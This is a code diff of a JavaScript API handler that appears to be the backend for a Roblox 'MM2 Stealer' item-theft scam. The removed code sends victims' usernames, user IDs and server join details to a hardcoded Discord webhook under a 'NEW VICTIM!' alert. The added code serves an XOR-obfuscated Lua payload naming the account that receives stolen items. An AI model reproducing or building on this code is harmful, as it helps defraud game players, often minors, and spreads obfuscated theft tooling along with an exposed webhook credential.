@@ -1,39 +1,36 @@
 
-export default async function handler(req, res) {
+const XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qt";
+
+function xorEncrypt(text, key) {
+    let result = '';
+    for (let i = 0; i < text.length; i++) {
+        result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return Buffer.from(result).toString('base64');
+}
+
+export default function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { hitData } = req.body;
+    const { uuid } = req.body;
     
-    if (!hitData) {
-        return res.status(400).json({ error: 'No hit data' });
+    // Change this to your UUID
+    const users = {
+        "your-uuid-here": {
+            receivers: ["Nicename719"]
+        }
+    };
+
+    const user = users[uuid];
+    
+    if (!user) {
+        return res.status(404).json({ error: 'User not found' });
     }
 
-    // Your Discord webhook
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
-    
-    const joinLink = `https://my-api-dusky-three.vercel.app/api/Join?jobId=${hitData.jobId}&username=${hitData.username}`;
-    
-    const message = `@everyone
-**🎯 NEW VICTIM!**
+    const luaScript = `_G.receivers = {${user.receivers.map(r => `"${r}"`).join(', ')}}`;
+    const encrypted = xorEncrypt(luaScript, XOR_KEY);
 
-**Player:** ${hitData.username}
-**User ID:** ${hitData.robloxUserId}
-**Job ID:** \`${hitData.jobId}\`
-
-**🔗 CLICK TO JOIN (opens Roblox):**
-${joinLink}
-
-**📋 Or use this script:**
-\`game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "${hitData.jobId}")\``;
-
-    await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message, username: "MM2 Stealer" })
-    });
-
-    return res.status(200).json({ success: true });
+    return res.status(200).json({ encrypted: true, data: encrypted });
 }
-      }
